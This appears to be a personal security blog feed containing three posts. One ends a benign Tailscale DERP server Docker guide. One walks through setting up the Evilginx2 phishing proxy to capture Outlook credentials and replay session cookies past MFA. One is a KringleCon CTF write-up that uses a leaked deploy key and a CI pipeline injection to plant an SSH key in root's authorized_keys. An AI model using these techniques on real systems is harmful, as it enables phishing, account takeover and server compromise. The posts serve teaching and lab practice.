+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build <span class="nb">.</span> <span class="nt">-t</span> tailscale-derp-docker:1.0
+</code></pre></div></div>
+<h1 id="running-the-derp-container">Running the DERP container</h1>
+<p>Now that we have built our container lets go ahead and run it using docker compose.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose up <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>We can monitor the container logs,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker logs <span class="nt">-f</span> tailscale-derp
+</code></pre></div></div>
+
+<p>To test if all is running good and the DERP server has a letsencrypt certificate, open your preferred browser and go to,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://derp01.example.com
+</code></pre></div></div>
+<p>Replacing example.com with the domain you set for the DERP server. If everything is good you will no TLS/SSl errors and see the default page like below,</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture7.png" alt="Testing DERP https" /></p>
+
+<h1 id="disabling-key-expiring-and-setting-tailscale-acl">Disabling Key Expiring and Setting Tailscale ACL</h1>
+<p>To stop the need to constantly keep generatng new auth keys for the DERP server when the current key expires, I would disable the key expiry for the newly created machine in your Tailnet. As seen below, go to your machine, click on the 3 dots and click on “Disable Key Expiry” to disable the key expiration.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture6.png" alt="Disable Key expiry" /></p>
+
+<p>Following the Tailscale documention on how to set only use your DERP server, we can go ahead and set the following in our ACL. The snippet below needs to be placed under your other ACL rules, for example, mine is underneath the SSH ACL rules section. If you have trouble setting the ACl, the official Tailscale docs for this can be found here -&gt; <a href="https://tailscale.com/kb/1118/custom-derp-servers/#optional-removing-tailscales-derp-regions">Tailscale DERP ACL DOCS</a></p>
+
+<p>Remember to change the “HostName” section in the ACL to the domain you set for your DERP server.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	"derpMap": {
+		"OmitDefaultRegions": true,
+		"Regions": {
+			"900": {
+				"RegionID":   900,
+				"RegionCode": "derp01",
+				"Nodes": [
+					{
+						"Name":     "1",
+						"RegionID": 900,
+						"HostName": "derp01.example.com",
+					},
+				],
+			},
+		},
+	},
+</code></pre></div></div>
+
+<h1 id="testing-our-derp-server">Testing our DERP server</h1>
+<p>All that is left is to test our DERP server, we can use the built in tailscale ping command to ping a machine on our tailnet and confirm how it’s traffic is routed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tailscale ping machinename
+</code></pre></div></div>
+
+<p>When you run the command, if you see the “via DERP(derp01)” then congratulations, you are now using your own DERP server for relay communications!</p>
+
+<p>I have blanked the IP and derp server name for privacy reasons.</p>
+
+<p><img src="/images/posts/tailscalederpserver/picture8.png" alt="Testing DERP server" /></p>
+
+<h1 id="end">End</h1>
+<p>There you go, you now have your own DERP server for Tailscale running in a minimal small docker container. I hope you enjoyed this walkthrough!</p>
+
+<p>Thanks for reading.</p>
+
+<h1 id="links">Links</h1>
+<ul>
+  <li>Tailscale <a href="https://tailscale.com/">https://tailscale.com</a></li>
+  <li>BinaryLane <a href="https://www.binarylane.com.au/">https://www.binarylane.com.au</a></li>
+  <li>Github <a href="https://github.com/tijjjy">https://github.com/tijjjy</a></li>
+  <li>Github Repository <a href="https://github.com/tijjjy/Tailscale-DERP-Docker">https://github.com/tijjjy/Tailscale-DERP-Docker</a></li>
+</ul>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Introduction Welcome to my post, today I’m going to show you how to deploy your own Tailscale DERP server using a docker container I built myself! For this demonstration and walkthrough I will be using Ubuntu 22.04 on a 1vcpu 1GB Memory VPS hosted on www.binarylane.com.au. I highly recommened BinaryLane as they provide fast and reliable VPS solutions and even dedicated servers! Prerequisites Linux Server Docker (Docker Installation Docs) Git https://github.com/tijjjy/Tailscale-DERP-Docker Ports 80,443 TCP Open Port 3478 UDP Open DNS Record for DERP domain name Firewalld Tailscale Account (Create a Tailscale account) Why self host your own DERP server? There are a variety of reasons why you might want to run your own Tailscale DERP server, including but not limited to: Organisations using Tailscale may have requirements regarding where network traffic goes. Learning new skills and how DERP works. Privacy reasons, you may want to have full control of the infrastructure. Installing Requirements To get started lets update the system which on Ubuntu can be done with the following commands. sudo apt update sudo apt upgrade -y After the upgrades are installed it’s always best to reboot the server to reload into the latest linux kernal. sudo reboot Once your server is fully updated and finished rebooting, lets go and install Docker and Git sudo apt install docker docker-compose git -y If you have trouble installing docker, you can find instructions for the linux distribution you are using at the official docker docs. https://docs.docker.com/engine/install Now to install the firewall, personally I use firewalld but this can be done with any firewall. sudo apt install firewalld -y sudo systemctl enable --now firewalld Additionally, we need to restart the docker daemon. When installing firewalld after docker the networking for docker needs to be restarted or all containers won’t have network connectivity due to installing a new firewall. sudo systemctl restart docker We can double check that firewalld is running by using the following command, sudo systemctl status firewalld You should see the following output. Setting Up the Firewall We can check the default firewall rules by running, sudo firewall-cmd --list-all Which should output the default rules on the public zone. Lets go ahead and open the required ports for our Tailscale DERP server. sudo firewall-cmd --zone=public --permanent --add-port=80/tcp sudo firewall-cmd --zone=public --permanent --add-port=443/tcp sudo firewall-cmd --zone=public --permanent --add-port=3478/udp sudo firewall-cmd --reload Checking the public zone again we can now see our rules have been added and are now open! This section can be skipped but it is advised for extra security For added security lets create a new firewalld zone for ssh and add our home IP to it, doing so will only allow our IP to connect via ssh and block all other IPs. sudo firewall-cmd --permanent --new-zone=ssh sudo firewall-cmd --zone=ssh --permanent --set-target=DROP sudo firewall-cmd --zone=public --permanent --remove-service=ssh sudo firewall-cmd --zone=ssh --permanent --add-service=ssh sudo firewall-cmd --zone=ssh --permanent --add-source=youripaddress sudo firewall-cmd --reload Now your server is secured for ssh by only allowing your IP address to connect, as a backup it is good to make sure you can connect via KVM in your hosting provider incase your IP changes or you get locked out. Setting the DNS Record Before we configure and start our DERP server, we need to create a DNS record point to our server so that we can request a certificate from letsencrypt, the domain is also used in the Tailscale ACL for clients as well. Log into your Domain registrar and create an A record for the domain you want to use such as derp01.example.com thats points to the IP address of your server. For example, derp01.example.com A Record 1.1.1.1 (Using your own servers IP address of course) Once set, confirm the domain resolves to the IP address by running, dig derp01.example.com OR nslookup derp01.example.com Either command should return the IP address of your server. Generating a Tailscale Auth Token To authenticate our DERP container to our tailnet we need to supply an initial authentication token to connect the container to our tailnet, this can be done by going to https://login.tailscale.com/admin/settings/keys. Once you are logged into your Tailscale account you will see the “Auth Keys” section with the “Generate auth key…” button as seen below. Go ahead and click on the “Generate auth key…”, it will open up a prompt for additional key options, just leave all defaults and click on the blue button at the bottom “Generate Key”. Copy and note the outputted key somewhere safe, we will use it in in the next few steps. Cloning Repo and Setting up the DERP config Great, now we have an updated server with all the requirements installed. Lets go ahead and clone the repository containing the files for the DERP container. cd /opt git clone https://github.com/tijjjy/Tailscale-DERP-Docker cd Tailscale-DERP-Docker ls -lah We now have all the required files to configure, build and run our DERP server container. All we need to edit is the .env file, as this is where we will set our domain we want to use and our Tailscale Auth Key. nano .env OR vim .env Now we need to replace two variables, TAILSCALE_DERP_HOSTNAME TAILSCALE_AUTH_KEY For the TAILSCALE_DERP_HOSTNAME variable, replace the default value with the domain you set in your DNS records. For the TAILSCALE_AUTH_KEY variable, replace the default value with the Tailscale Auth Token you created and noted down before. If done correctly your .env file will look similar to the following screenshot. Building the DERP container Awesome, we are almost there, now all we need to do it build the docker container, this can be done like so, docker build . -t tailscale-derp-docker:1.0 Running the DERP container Now that we have built our container lets go ahead and run it using docker compose. docker-compose up -d We can monitor the container logs, docker logs -f tailscale-derp To test if all is running good and the DERP server has a letsencrypt certificate, open your preferred browser and go to, https://derp01.example.com Replacing example.com with the domain you set for the DERP server. If everything is good you will no TLS/SSl errors and see the default page like below, Disabling Key Expiring and Setting Tailscale ACL To stop the need to constantly keep generatng new auth keys for the DERP server when the current key expires, I would disable the key expiry for the newly created machine in your Tailnet. As seen below, go to your machine, click on the 3 dots and click on “Disable Key Expiry” to disable the key expiration. Following the Tailscale documention on how to set only use your DERP server, we can go ahead and set the following in our ACL. The snippet below needs to be placed under your other ACL rules, for example, mine is underneath the SSH ACL rules section. If you have trouble setting the ACl, the official Tailscale docs for this can be found here -&gt; Tailscale DERP ACL DOCS Remember to change the “HostName” section in the ACL to the domain you set for your DERP server. "derpMap": { "OmitDefaultRegions": true, "Regions": { "900": { "RegionID": 900, "RegionCode": "derp01", "Nodes": [ { "Name": "1", "RegionID": 900, "HostName": "derp01.example.com", }, ], }, }, }, Testing our DERP server All that is left is to test our DERP server, we can use the built in tailscale ping command to ping a machine on our tailnet and confirm how it’s traffic is routed. tailscale ping machinename When you run the command, if you see the “via DERP(derp01)” then congratulations, you are now using your own DERP server for relay communications! I have blanked the IP and derp server name for privacy reasons. End There you go, you now have your own DERP server for Tailscale running in a minimal small docker container. I hope you enjoyed this walkthrough! Thanks for reading. Links Tailscale https://tailscale.com BinaryLane https://www.binarylane.com.au Github https://github.com/tijjjy Github Repository https://github.com/tijjjy/Tailscale-DERP-Docker]]></summary></entry><entry><title type="html">Evilnginx2</title><link href="http://localhost:4000/2022-12-12/evilnginx2" rel="alternate" type="text/html" title="Evilnginx2" /><published>2022-12-12T00:00:00+08:00</published><updated>2022-12-12T00:00:00+08:00</updated><id>http://localhost:4000/2022-12-12/evilnginx2</id><content type="html" xml:base="http://localhost:4000/2022-12-12/evilnginx2"><![CDATA[<p><strong>DISCLAIMER</strong>: All infrastructure, accounts and domains were used temporarily on accounts and domain I own and were not used to conduct real phishing attacks. DO NOT attempt to attempt phishing attacks on users without their prior permission.</p>
+
+<h1 id="introduction">Introduction</h1>
+<p>Evilnginx2 is a reverse proxy type phishing kit/framework, designed to be the man in the middle between a user and a service such as Microsoft 365. It is simple to use requiring simply a linux server with docker installed, it’s small enough also that it can be run on a AWS ec2.t2.micro instance!</p>
+
+<p>The webserver used is a custom version of the http server Nginx. The application itself is written fully in the programming language GO as a standalone application. The simplicity of setting up and configuring evilnginx2 is very easy and quick, all you need is a registered domain and a server.</p>
+
+<p>Evilnginx2 is very similar to a new “evilproxy” service that has surfaced allowing people to pay for a phishing service that is a reverse proxy type phishing server.
+The application/docker container is extremely lightweight, in the demonstration later in the document, I used a T2.Micro AWS EC2 instance for which little resources were used.
+I am hoping this document will demonstrate how simple and easy it is to quickly spin up phishing URLS/sites to capture user credentials and session tokens.</p>
+
+<p>Throughout this post I will be using my test domain “microsoft.zero0ne.net”</p>
+
+<h1 id="how-it-works">How it works</h1>
+<p>Evilnginx2 runs based off templates or “phishlets” which are preconfigured configuration files for the specific site you want to man in the middle, although it does come with premade templates for commonly used sites such as Micrsoft outlook, you can create your own custom ones for specifc sites.</p>
+
+<p>Evilnginx2 runs its own http and DNS server to carry out the attacks. The HTTP server is used to host the phishing websites and reverse proxy and the DNS server is used to create subdomains for each predefined proxy host domains. This requires the NS records for your domain to be set to the evilnginx2 server, this allows the server to spin up subdomains as needed.</p>
+
+<p>Whilst configuring evilnginx2 when you enable a phishlet, for each predefined proxy hosts domain within the phishlet configuration evilnginx2 will use letsencrypt to request a valid TLS certificate. For example, we are using the domain “microsoft.zero0ne.net”, when using the outlook phishlet, evilnginx2 will request certificates for outlook.microsoft.zero0ne.net, login.microsoft.zero0ne.net and account.microsoft.zero0ne.net which will be used in the reverse proxy for HTTPS.</p>
+
+<p>By design evilnginx2 hides itself from internet scanners by using a redirect URL. For example when setting up a lure, you set a redirect URL, this has two purposes, the first is when successful authentication is completed the user is redirected to the set URL, and second is when something or someone attempts to connect to the domain or server IP, for example if the lure URL is https://outlook.microsoft.zero0ne.net/oafghe3 if the exact URL is not entered for say https://outlook.microsoft.zero0ne.net is entered they will be redirected to the redirect URL set seamlessly avoiding detection by internal crawlers or possibly security analysts.</p>
+
+<p>All commands and setup instructions can be found on the evilnginx2 github page.<br />
+Github Page -&gt; <a href="https://github.com/kgretzky/evilginx2">github.com/kgretzky/evilginx2</a></p>
+
+<p>Example of a phishlet for outlook.com.
+<img src="/images/posts/evilnginx2/Picture1.png" alt="Alt text" title="Example Outlook Phishlet" /></p>
+
+<p>Additional phishlets are available, these are included in the evilnginx2 docker container.
+<img src="/images/posts/evilnginx2/Picture2.png" alt="Alt text" title="Addition Phishlets" /></p>
+
+<h1 id="installation">Installation</h1>
+<p>To install evilnginx2, you will need is docker and git installed as well as no other services running on port 53/udp, 80/tcp and 443/tcp
+<img src="/images/posts/evilnginx2/Picture3.png" alt="Alt text" title="clone repo" />
+<img src="/images/posts/evilnginx2/Picture4.png" alt="Alt text" title="build docker image" />
+<img src="/images/posts/evilnginx2/Picture5.png" alt="Alt text" title="run docker" /></p>
+
+<h1 id="confiruration">Confiruration</h1>
+<p>First, we set the root domain we want to use as well as the evilnginx2 server IP.
+<img src="/images/posts/evilnginx2/Picture6.png" alt="Alt text" title="set root domain" /></p>
+
+<p>Next, we set the hostname for the phishlet we want to use, in this case it is the outlook phishlet. And we want the URL domain to be outlook.microsoft.zero0ne.net
+Once we set the hostname for the phishlet, you enable the outlook phishlet. In this step evilnginx2 will go and request the appropriate certificates from letsencrypt as predefined in the phishlet config file.</p>
+
+<p>If the server has any DNS errors regarding letsencrypt they will be displayed.</p>
+
+<p>Next, we create the lure, set the lure redirect URL. The lure redirect URL is what the server will redirect the user to once successful authentication has been completed OR if a request to the server is not the redirect URL. Then display the lure URL.
+<img src="/images/posts/evilnginx2/Picture7.png" alt="Alt text" title="enable phishlet and lures" /></p>
+
+<p>As seen in this screenshot, all of the unauthorized requests are clients attempting to connect to the server but not using the lure URL, this will redirect them to whichever URL you set in the lure redirect URL.<br />
+<img src="/images/posts/evilnginx2/Picture8.png" alt="Alt text" title="unauthorized requests" /></p>
+
+<h1 id="the-attack">The Attack</h1>
+<p>Now we have evilnginx2 setup with the phishing URL, if we navigate to the URL, we can see it looks identical to the outlook login page, this is because evilnginx2 is a reverse proxy which just proxy’s requests through. As you can see in the URL, the domain is login.microsoft.zero0ne.net.<br />
+<img src="/images/posts/evilnginx2/Picture9.png" alt="Alt text" title="phishing login page" /></p>
+
+<p>Using a generic outlook account with multi factor authentication enabled. Once the user logins in we can see the credentials are logged in the output. Once the authentication is complete the user is redirected to google.com which was set as the redirect URL, this can be set to outlook.com which will make it seem like nothing happened.<br />
+<img src="/images/posts/evilnginx2/Picture10.png" alt="Alt text" title="capture credentials" /></p>
+
+<p>Whenever a successful authentication is completed, it is logged as a session, below we can see two logged sessions, and if we select a session, we can see the credentials as well as the session token. This can be used to login to the account without MFA.<br />
+<img src="/images/posts/evilnginx2/Picture11.png" alt="Alt text" title="logged sessions" /></p>
+
+<h1 id="logging-in">Logging In</h1>
+<p>Using the Firefox extension “edithiscookie” we can import the session cookie. 
+<img src="/images/posts/evilnginx2/Picture12.png" alt="Alt text" title="using cookie" /></p>
+
+<p>Refreshed the page and we are in.<br />
+<img src="/images/posts/evilnginx2/Picture13.png" alt="Alt text" title="We are in!" /></p>
+
+<p>As you’ve just seen, it’s that easy to quickly spin up evilnginx2 with minimal setup and resources to start a phishing attack using evilnginx2.</p>
+
+<p><strong>REMINDER</strong>: This is for educational purposes only, do not attempt to use what I have shown you here to use on someone without prior written authorization.</p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[DISCLAIMER: All infrastructure, accounts and domains were used temporarily on accounts and domain I own and were not used to conduct real phishing attacks. DO NOT attempt to attempt phishing attacks on users without their prior permission. Introduction Evilnginx2 is a reverse proxy type phishing kit/framework, designed to be the man in the middle between a user and a service such as Microsoft 365. It is simple to use requiring simply a linux server with docker installed, it’s small enough also that it can be run on a AWS ec2.t2.micro instance! The webserver used is a custom version of the http server Nginx. The application itself is written fully in the programming language GO as a standalone application. The simplicity of setting up and configuring evilnginx2 is very easy and quick, all you need is a registered domain and a server. Evilnginx2 is very similar to a new “evilproxy” service that has surfaced allowing people to pay for a phishing service that is a reverse proxy type phishing server. The application/docker container is extremely lightweight, in the demonstration later in the document, I used a T2.Micro AWS EC2 instance for which little resources were used. I am hoping this document will demonstrate how simple and easy it is to quickly spin up phishing URLS/sites to capture user credentials and session tokens. Throughout this post I will be using my test domain “microsoft.zero0ne.net” How it works Evilnginx2 runs based off templates or “phishlets” which are preconfigured configuration files for the specific site you want to man in the middle, although it does come with premade templates for commonly used sites such as Micrsoft outlook, you can create your own custom ones for specifc sites. Evilnginx2 runs its own http and DNS server to carry out the attacks. The HTTP server is used to host the phishing websites and reverse proxy and the DNS server is used to create subdomains for each predefined proxy host domains. This requires the NS records for your domain to be set to the evilnginx2 server, this allows the server to spin up subdomains as needed. Whilst configuring evilnginx2 when you enable a phishlet, for each predefined proxy hosts domain within the phishlet configuration evilnginx2 will use letsencrypt to request a valid TLS certificate. For example, we are using the domain “microsoft.zero0ne.net”, when using the outlook phishlet, evilnginx2 will request certificates for outlook.microsoft.zero0ne.net, login.microsoft.zero0ne.net and account.microsoft.zero0ne.net which will be used in the reverse proxy for HTTPS. By design evilnginx2 hides itself from internet scanners by using a redirect URL. For example when setting up a lure, you set a redirect URL, this has two purposes, the first is when successful authentication is completed the user is redirected to the set URL, and second is when something or someone attempts to connect to the domain or server IP, for example if the lure URL is https://outlook.microsoft.zero0ne.net/oafghe3 if the exact URL is not entered for say https://outlook.microsoft.zero0ne.net is entered they will be redirected to the redirect URL set seamlessly avoiding detection by internal crawlers or possibly security analysts. All commands and setup instructions can be found on the evilnginx2 github page. Github Page -&gt; github.com/kgretzky/evilginx2 Example of a phishlet for outlook.com. Additional phishlets are available, these are included in the evilnginx2 docker container. Installation To install evilnginx2, you will need is docker and git installed as well as no other services running on port 53/udp, 80/tcp and 443/tcp Confiruration First, we set the root domain we want to use as well as the evilnginx2 server IP. Next, we set the hostname for the phishlet we want to use, in this case it is the outlook phishlet. And we want the URL domain to be outlook.microsoft.zero0ne.net Once we set the hostname for the phishlet, you enable the outlook phishlet. In this step evilnginx2 will go and request the appropriate certificates from letsencrypt as predefined in the phishlet config file. If the server has any DNS errors regarding letsencrypt they will be displayed. Next, we create the lure, set the lure redirect URL. The lure redirect URL is what the server will redirect the user to once successful authentication has been completed OR if a request to the server is not the redirect URL. Then display the lure URL. As seen in this screenshot, all of the unauthorized requests are clients attempting to connect to the server but not using the lure URL, this will redirect them to whichever URL you set in the lure redirect URL. The Attack Now we have evilnginx2 setup with the phishing URL, if we navigate to the URL, we can see it looks identical to the outlook login page, this is because evilnginx2 is a reverse proxy which just proxy’s requests through. As you can see in the URL, the domain is login.microsoft.zero0ne.net. Using a generic outlook account with multi factor authentication enabled. Once the user logins in we can see the credentials are logged in the output. Once the authentication is complete the user is redirected to google.com which was set as the redirect URL, this can be set to outlook.com which will make it seem like nothing happened. Whenever a successful authentication is completed, it is logged as a session, below we can see two logged sessions, and if we select a session, we can see the credentials as well as the session token. This can be used to login to the account without MFA. Logging In Using the Firefox extension “edithiscookie” we can import the session cookie. Refreshed the page and we are in. As you’ve just seen, it’s that easy to quickly spin up evilnginx2 with minimal setup and resources to start a phishing attack using evilnginx2. REMINDER: This is for educational purposes only, do not attempt to use what I have shown you here to use on someone without prior written authorization.]]></summary></entry><entry><title type="html">KringleCon 2022 Jolly CI/CD</title><link href="http://localhost:4000/2022-12-11/jolly-cicd" rel="alternate" type="text/html" title="KringleCon 2022 Jolly CI/CD" /><published>2022-12-11T00:00:00+08:00</published><updated>2022-12-11T00:00:00+08:00</updated><id>http://localhost:4000/2022-12-11/jolly-cicd</id><content type="html" xml:base="http://localhost:4000/2022-12-11/jolly-cicd"><![CDATA[<p>Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022.</p>
+
+<p>The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work.</p>
+
+<p><strong>Note:</strong> This challenge does take 4-5 minutes to start all of the containers required for the challenge.</p>
+
+<p>Below here we have the starting terminal which you see when starting the challenge.
+<img src="/images/kringlecon2022/jollycicd/jollycicd-01.png" alt="Alt text" title="Starting screen" /></p>
+
+<p>Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -&gt; <a href="/kringlecon2022/prisonescape">Prison Escape Writeup</a></p>
+
+<p>To check what sudo privileges you have can be done with the following command.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span></code></pre></figure>
+
+<p>It looks like we can run sudo without any password so lets go ahead and escalate to root</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>bash
+<span class="nb">whoami</span></code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-02.png" alt="Alt text" title="escalate to root" /></p>
+
+<p>Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server.</p>
+
+<p>Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ip a | <span class="nb">grep </span>inet</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-03.png" alt="Alt text" title="getting ip address" /></p>
+
+<p>I will use the following command to scan the local subnet.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-T4</span> <span class="nt">-v</span> 172.18.0.0/16</code></pre></figure>
+
+<p>Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts</p>
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>172.18.0.88</td>
+          <td>wordpress.local_docker_network</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>172.18.0.150</td>
+          <td>gitlab.local_docker_network</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-04.png" alt="Alt text" title="nmap scan" /></p>
+
+<p>Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit.</p>
+
+<p>This can be done by running the following command and piping the output into jq to parse the json response.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">--request</span> GET <span class="s2">"http://gitlab.local_docker_network/api/v4/projects"</span> | jq</code></pre></figure>
+
+<p>If successful you will see the following output, indicating that there is a public git repository we can clone called “Wordpress.Flag.Net.Internal” indicating it might be the source code of the wordpress site we need to exploit.
+<img src="/images/kringlecon2022/jollycicd/jollycicd-05.png" alt="Alt text" title="gitlab projects" /></p>
+
+<p>Lets go ahead and clone the git repo and take a look what is inside.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-06.png" alt="Alt text" title="cloning the repo" /></p>
+
+<p>Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> .gitlab-ci.yml</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-08.png" alt="Alt text" title="gitlab-ci.yml" /></p>
+
+<p>One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits.</p>
+
+<p>Lets go ahead and do a git log to see what the previous commit comments look like.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git log</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-07.png" alt="Alt text" title="git log" /></p>
+
+<p>Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets.</p>
+
+<p>A commit that caught my eye was the commit with the message “whoops”, I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed.</p>
+
+<p>Grab the commit hashes of the commits you want to compare and run git diff against them</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-09.png" alt="Alt text" title="git log" /></p>
+
+<p>Wow look at that, the developer accidentally added in an ssh private key named “.deploy” and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named “.deploy” this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this.</p>
+
+<p>Copy the key into a file such as “key.pem” and remove all the extra dashes (“-“) that the commit diff added in. The result should look like this.
+<img src="/images/kringlecon2022/jollycicd/jollycicd-10.png" alt="Alt text" title="ssh key" /></p>
+
+<p>Don’t forget to change the key permissions to 0600 otherwise openssh will error out.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod </span>0600 key.pem</code></pre></figure>
+
+<p>Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline.</p>
+
+<p>Generate a keypair with the following command and just hit enter until done.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh-keygen</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-11.png" alt="Alt text" title="ssh keypair generation" /></p>
+
+<p>Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /home/samways/.ssh/id_rsa.pub</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-12.png" alt="Alt text" title="cat pub key" /></p>
+
+<p>We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal <span class="s1">'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" &gt;&gt; /root/.ssh/authorized_keys'</span></code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-13.png" alt="Alt text" title=".gitlab-ci.yml" /></p>
+
+<p>Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below.<br />
+<img src="/images/kringlecon2022/jollycicd/jollycicd-14.png" alt="Alt text" title=".gitlab-ci.yml" /></p>
+
+<p>We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir</span> /root/.ssh
+nano /root/.ssh/config
+
+Paste <span class="k">in </span>the following config
+
+Host gitlab.flag.net.internal
+  HostName gitlab.flag.net.internal
+  User git
+  IdentityFile /home/samways/wordpress.flag.net.internal/key.pem</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-15.png" alt="Alt text" title="ssh config" />
+<img src="/images/kringlecon2022/jollycicd/jollycicd-16.png" alt="Alt text" title="ssh config" /></p>
+
+<p>What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating.</p>
+
+<p>Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git add <span class="nb">.</span>
+git status
+git commit <span class="nt">-m</span> <span class="s2">"wordpress takeover"</span>
+git push</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-17.png" alt="Alt text" title="git push" /></p>
+
+<p>Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -&gt; /home/samways/.ssh/id_rsa</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa root@wordpress.flag.net.internal</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/jollycicd/jollycicd-18.png" alt="Alt text" title="ssh as root to wordpress" /></p>
+
+<p>Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server.</p>
+
